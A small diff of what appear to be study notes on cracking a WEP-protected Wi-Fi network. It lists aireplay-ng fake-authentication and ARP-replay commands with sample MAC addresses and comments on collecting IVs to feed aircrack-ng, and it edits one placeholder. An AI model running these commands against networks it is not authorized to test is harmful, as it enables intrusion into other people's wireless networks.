@@ -68,7 +68,7 @@ aireplay-ng --fakeauth 0 -a 64:16:F0:EC:78:F3 -h 48:5D:60:2A:45:25 mon0
 # this couases the Access Point to produce another pakcet with a new IV
 # keep doing this until we have enought IVs to crack the key
 
-aireplay-ng --arpreplay -b <mac-address-of-the-target> -h <mac-address-of-wireless-adapter> <name-of-wireless-adapter>
+aireplay-ng --arpreplay -b <mac-address-of-the-target> -h <mac-address-of-wireless-adapter/first twelve digits> <name-of-wireless-adapter>
 aireplay-ng --arpreplay -b 64:16:F0:EC:78:F3 -h 48:5D:60:2A:45:25 mon0
 
 # then we're going to run aircrack-ng against the file that we captured in order to crack the key
